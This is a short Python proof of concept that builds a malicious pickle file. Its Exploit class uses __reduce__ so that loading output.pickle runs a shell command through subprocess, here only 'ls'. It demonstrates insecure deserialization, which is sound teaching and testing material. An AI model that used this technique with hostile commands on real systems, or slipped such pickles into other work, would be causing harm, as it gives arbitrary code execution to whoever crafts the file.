#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Floyd Hightower <https://github.com/fhightower>
# December 2016
"""Create an exploited pickle."""

import pickle
import subprocess


class Exploit(object):
    """Simple class designed to be exploited."""

    def __reduce__(self):
        """Define how to unpack an Exploit object."""
        return (subprocess.call, (('ls',),))


with open("output.pickle", "wb") as output_file:
    pickle.dump(Exploit(), output_file)
    output_file.close()
